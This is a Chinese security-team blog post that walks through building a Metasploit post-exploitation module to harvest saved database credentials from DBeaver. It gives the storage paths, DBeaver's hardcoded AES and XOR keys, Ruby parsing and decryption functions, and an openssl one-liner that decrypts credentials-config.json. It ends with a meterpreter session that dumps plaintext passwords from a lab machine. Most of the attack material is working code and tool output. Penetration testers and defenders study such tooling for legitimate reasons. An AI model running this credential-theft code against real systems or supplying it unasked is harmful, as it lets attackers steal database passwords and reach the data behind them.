#  编写Metasploit插件获取DBeaver密码

原创 三米前有蕉皮  [ 雷神众测 ](javascript:void\(0\);)

**雷神众测** ![]()

微信号 bounty_team

功能介绍 雷神众测，专注于渗透测试技术及全球最新网络攻击技术的分析。

____

___发表于_

收录于合集

![](https://gitee.com/fuli009/images/raw/master/public/20230216150604.png)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![](https://gitee.com/fuli009/images/raw/master/public/20230216150621.png)

前言

https://github.com/dbeaver/dbeaver是一个开源社区版免费数据库管理工具，支持的连接方式众多，深受大家喜欢，在实战中也经常遇到该软件，所以打算编写后渗透插件获取dbeaver的数据库帐号密码信息。

  

![](https://gitee.com/fuli009/images/raw/master/public/20230216150621.png)

凭证存放的路径

版本6.1.3及以上

![](https://gitee.com/fuli009/images/raw/master/public/20230216150622.png)

版本6.1.3以下

![](https://gitee.com/fuli009/images/raw/master/public/20230216150624.png)

在目录下面有两个文件：credentials-config.json，data-
sources.json，前面的保存加密过后的密码，后面的保存连接名称，主机名，端口，数据库等等信息。

data-sources.json里面没有密码，mysql8-1849e7eaca6-1d233a585c8f4388，为连接名称，下面的是连接配置

    
    
    {  
    	"folders": {},  
    	"connections": {  
    		"mysql8-1849e7eaca6-1d233a585c8f4388": {  
    			"provider": "mysql",  
    			"driver": "mysql8",  
    			"name": "db",  
    			"save-password": true,  
    			"read-only": false,  
    			"configuration": {  
    				"host": "localhost",  
    				"port": "3306",  
    				"database": "db",  
    				"url": "jdbc:mysql://localhost:3306/db",  
    				"home": "mysql_client",  
    				"type": "dev",  
    				"auth-model": "native",  
    				"handlers": {}  
    			}  
    		}  
    	},  
    	"connection-types": {  
    		"dev": {  
    			"name": "Development",  
    			"color": "255,255,255",  
    			"description": "Regular development database",  
    			"auto-commit": true,  
    			"confirm-execute": false,  
    			"confirm-data-change": false,  
    			"auto-close-transactions": false  
    		}  
    	}  
    }

剩下那个文件就是按照不同的版本加密后的二进制文件，并不是一个明文json文件，但是解密后是一个json格式的。

旧版的：.dbeaver-data-sources.xml

    
    
    <?xml version="1.0" encoding="UTF-8"?>  
    <data-sources>  
    	<data-source id="mysql8-184d21e1de1-62edc23b6c8c8636" provider="mysql" driver="mysql8" name="Test_MYSQL" save-password="true" read-only="false">  
    		<connection host="localhost" port="3306" server="" database="db" url="jdbc:mysql://localhost:3306/db" user="root" password="BwEVNH5TRQUWBQksE3ak" type="dev"/>  
    	</data-source>  
    	<data-source id="postgres-jdbc-184d221fd09-20a857415882add4" provider="postgresql" driver="postgres-jdbc" name="Test_PostgreSQL" save-password="true" read-only="false">  
    		<connection host="localhost" port="5432" server="" database="postgres" url="jdbc:postgresql://localhost:5432/postgres" user="postgres" password="BwEVNH5TRQUWBQksEwQltw==" type="dev">  
    			<provider-property name="@dbeaver-show-non-default-db@" value="false"/>  
    			<provider-property name="@dbeaver-show-template-db@" value="false"/>  
    		</connection>  
    	</data-source>  
    	<filters/>  
    </data-sources>

![](https://gitee.com/fuli009/images/raw/master/public/20230216150621.png)

版本配置合并

当你从低版本更新到最新版本，软件会提示你是否迁移，但是迁移过后还是一个旧版的XML文件，而且算法也没有更新，所以不能单凭路径判断解密版本，直接按照文件后缀名判断就可以了，xml为旧版，json为新版。

![](https://gitee.com/fuli009/images/raw/master/public/20230216150626.png)

这个迁移操作就是把整个文件夹拷贝过去，就算你在之前的那个文件有其他文件也会被拷贝过去的。导致就算是新版的配置文也是.dbeaver-data-
sources.xml，只不过路径变成了C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General。

![](https://gitee.com/fuli009/images/raw/master/public/20230216150621.png)

数据提取

 **XML文件的**

    
    
     def parse_xml(data)  
      mxml = REXML::Document.new(data).root  
      result_hashmap = Hash.new  
      mxml.elements.to_a('//data-sources//data-source//connection//').each do |node|  
        if node.name == 'connection'  
          data_source_id = node.parent.attributes['id']  
          result_hashmap[data_source_id]= Hash[  
            'provider'=>node.parent.attributes['provider'],  
            'name'=>node.parent.attributes['name'],  
            'host'=>node.attributes['host'],  
            'port'=>node.attributes['port'],  
            'database'=>node.attributes['database'],  
            'url'=>node.attributes['url'],  
            'user'=>node.attributes['user'],  
            'password'=>decrypt_dbeaver_6_1_3(node.attributes['password']),  
        ]  
        end  
      end  
      print_good("# {result_hashmap}")  
      return result_hashmap  
    end

得到结果返回一个HashMap，以id为键，数据库配置为值，为了兼容新版的统一结构，因为新版的帐号密码和连接配置分开了两个json文件，两个json文件对对应关系就是以id为主键一对一关系的。

    
    
    [+] {"mysql8-184d21e1de1-62edc23b6c8c8636"=>{"provider"=>"mysql", "name"=>"Test_MYSQL", "host"=>"localhost", "port"=>"3306", "database"=>"db", "url"=>"jdbc:mysql://localhost:3306/db", "user"=>"root", "password"=>"test_password"}, "postgres-jdbc-184d221fd09-20a857415882add4"=>{"provider"=>"postgresql", "name"=>"Test_PostgreSQL", "host"=>"localhost", "port"=>"5432", "database"=>"postgres", "url"=>"jdbc:postgresql://localhost:5432/postgres", "user"=>"postgres", "password"=>"test_passwordr"}}

 **JSON文件的**

先将凭证解密成明文json字符串，然后序列化后一起传到处理data_sources的json函数了，利用id的对应关系拼接数据。

    
    
    def parse_data_sources(data, credentials)  
      result_hashmap = Hash.new  
      begin  
        data_sources = JSON.parse(data)  
        connections = data_sources['connections']  
        connections.each do |data_source_id, item|  
          result_hashmap[data_source_id] = Hash[  
            'name' => item['name'],  
            'provider' => item['provider'],  
            'host' => item['configuration']['host'],  
            'port' => item['configuration']['port'],  
            'user' => credentials[data_source_id]['# connection']['user'],  
            'password' => credentials[data_source_id]['# connection']['password'],  
            'database' => item['configuration']['database'],  
            'url' => item['configuration']['url'],  
            'type' => item['configuration']['type']  
        ]  
        end  
      rescue ::JSON::ParserError  
        return result_hashmap  
      end  
      return result_hashmap  
    end

  

![](https://gitee.com/fuli009/images/raw/master/public/20230216150621.png)

解密算法

dbeaver有两个算法，分别在版本 **6.1.3** ，做为分界线

![](https://gitee.com/fuli009/images/raw/master/public/20230216150631.png)

JSON解密算法

    
    
    ➜  ~ openssl aes-128-cbc -d -K babb4a9f774ab853c96c2d653dfe544a -iv 00000000000000000000000000000000 -in "${HOME}/Library/DBeaverData/workspace6/General/.dbeaver/credentials-config.json" | dd bs=1 skip=16 2>/dev/null
    
    
    AES_KEY = "\xBA\xBBJ\x9FwJ\xB8S\xC9l-e=\xFETJ".freeze  
    def decrypt_dbeaver_credentials(data)  
      aes = OpenSSL::Cipher.new('AES-128-CBC')  
      begin  
        aes.decrypt  
        aes.key = AES_KEY  
        plaintext = aes.update(data)  
        plaintext << aes.final  
      rescue OpenSSL::Cipher::CipherError => e  
        puts "Unable to decode: \"# {data}\" Exception: # {e}"  
      end  
      return plaintext[plaintext.index('{"')..]  
    end

![](https://gitee.com/fuli009/images/raw/master/public/20230216150633.png)

XML文件的解密算法，非常的简单，硬编码了异或密钥，将XML文件的password字段的值base64解码后回去数据长度，以数据长度为range索引，数据每位与异或密钥的索引与密钥长度取余得到单个字符，但是最后面两个字符不能异或，所以要删除掉，最后把字符拼接一起就是明文密码了。  

    
    
    SECRET_KEY = 'sdf@!# $verf^wv%6Fwe%$$# FFGwfsdefwfe135s$^H)dg'.freeze  
      
    def decrypt_dbeaver_6_1_3(base64_string)  
      plaintext=""  
      if base64_string.nil?  
        return  plaintext  
      end  
      data = Rex::Text.decode_base64(base64_string)  
      for i in 0..data.length-3  
        xor_data = Rex::Text.xor(data[i],SECRET_KEY[i% SECRET_KEY.length])  
        plaintext=plaintext+xor_data  
      end  
      return plaintext  
    end

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20230216150621.png)

效果

    
    
    meterpreter > run post/windows/gather/credentials/dbeaver  
      
    [*] Gather Dbeaver Passwords on FireEye  
    [+] dbeaver .dbeaver-data-sources.xml saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_319751.txt  
    [*] Finished processing C:\Users\FireEye\.dbeaver4\General\.dbeaver-data-sources.xml  
    [+] dbeaver credentials-config.json saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_334807.txt  
    [+] dbeaver data-sources.json saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_309767.txt  
    [*] Finished processing C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver  
    [+] Passwords stored in: /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_host.dbeaver_421133.txt  
    [+] Dbeaver Password  
    ================  
      
    Name             Protocol    Hostname   Port  Username  Password        DB        URI                                        Type  
    ----             --------    --------   ----  --------  --------        --        ---                                        ----  
    Test_MYSQL       mysql       localhost  3306  root      test_password   db        jdbc:mysql://localhost:3306/db             dev  
    Test_PostgreSQL  postgresql  localhost  5432  postgres  test_passwordr  postgres  jdbc:postgresql://localhost:5432/postgres  dev  
    localhost        mysql       localhost  3306  root      test_mysql      db        jdbc:mysql://localhost:3306/db             test  
    postgres         postgresql  localhost  5432  postgres  test_postgres   postgres  jdbc:postgresql://localhost:5432/postgres  prod  
      
    meterpreter >

  

![](https://gitee.com/fuli009/images/raw/master/public/20230216150621.png)

参考

https://github.com/rapid7/metasploit-framework/pull/17337

https://github.com/dbeaver/dbeaver/wiki/Admin-Manage-Connections

https://stackoverflow.com/questions/39928401/recover-db-password-stored-in-my-
dbeaver-connection

  

 **安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![](https://gitee.com/fuli009/images/raw/master/public/20230216150637.png)

END

![](https://gitee.com/fuli009/images/raw/master/public/20230216150639.png)![](https://gitee.com/fuli009/images/raw/master/public/20230216150640.png)![](https://gitee.com/fuli009/images/raw/master/public/20230216150641.png)

 **长按识别二维码关注我们**

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

